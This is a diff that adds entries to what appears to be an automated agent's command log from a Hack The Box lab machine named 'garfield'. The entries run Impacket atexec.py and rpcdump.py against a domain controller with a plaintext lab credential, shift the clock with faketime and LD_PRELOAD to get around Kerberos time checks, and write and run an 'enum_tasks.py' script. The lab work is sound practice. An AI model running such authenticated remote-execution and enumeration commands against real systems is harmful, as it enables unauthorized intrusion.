@@ -49,3 +49,24 @@ for i in $(seq 1 24); do
 done
 echo "=== Responder output ==="
 cat /tmp/responder_out.txt 2>/dev/null || true
+[10:45:23] RUN: faketime '+8 hours' atexec.py 'YOURCOMPANY.COM/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 'schtasks /query /fo LIST /v' 2>&1 | head -100
+[10:45:24] RUN: cat state/surface.jsonl 2>/dev/null | grep -i domain | head -5
+[10:45:27] RUN: which faketime 2>/dev/null; dpkg -l | grep faketime 2>/dev/null; which ntpdate 2>/dev/null
+[10:45:32] RUN: which atexec.py 2>/dev/null; which impacket-atexec 2>/dev/null; find / -name "atexec*" -type f 2>/dev/null | head -5
+[10:45:37] RUN: export KRB5_CONFIG=/dev/null; faketime '+8 hours' /home/hacker/.local/bin/atexec.py 'GARFIELD.HTB/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 'schtasks /query /fo LIST' 2>&1 | head -100
+[10:45:43] RUN: faketime '+8 hours' rpcdump.py 'GARFIELD.HTB/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 2>&1 | grep -i "tsch\|task\|86D35949" | head -20
+[10:45:45] RUN: faketime '+8 hours' rpcdump.py 'GARFIELD.HTB/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 2>&1 | head -60
+[10:45:48] RUN: which rpcdump.py 2>/dev/null; find / -name "rpcdump*" -type f 2>/dev/null | head -5
+[10:45:54] RUN: LD_PRELOAD=/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1 FAKETIME="+8h" /home/hacker/.local/bin/rpcdump.py 'GARFIELD.HTB/j.arbuckle:Th1sD4mnC4t!@1978'@10.129.17.178 2>&1 | grep -i "tsch\|task\|86D35949\|ITaskScheduler" | head -20
+[10:46:06] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
+[10:46:09] RUN: LD_PRELOAD=/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1 FAKETIME="+8h" python3 exploits/enum_tasks.py 2>&1
+[10:47:33] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
+[10:47:35] RUN: ls /htb/machines/garfield/exploits/enum_tasks.py 2>/dev/null && echo EXISTS || echo NEW
+[10:47:38] READ: /htb/machines/garfield/exploits/enum_tasks.py
+[10:47:49] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
+[10:47:51] RUN: faketime +8h python3 exploits/enum_tasks.py 2>&1
+[10:47:54] RUN: faketime '2026-04-07 20:00:00' python3 exploits/enum_tasks.py 2>&1
+[10:47:59] RUN: python3 exploits/enum_tasks.py 2>&1
+[10:50:04] WRITE: /htb/machines/garfield/exploits/enum_tasks.py
+[10:50:07] GLOB: /htb/machines/garfield/exploits/enum_tasks.py
+[10:50:09] READ: /htb/machines/garfield/exploits/enum_tasks.py
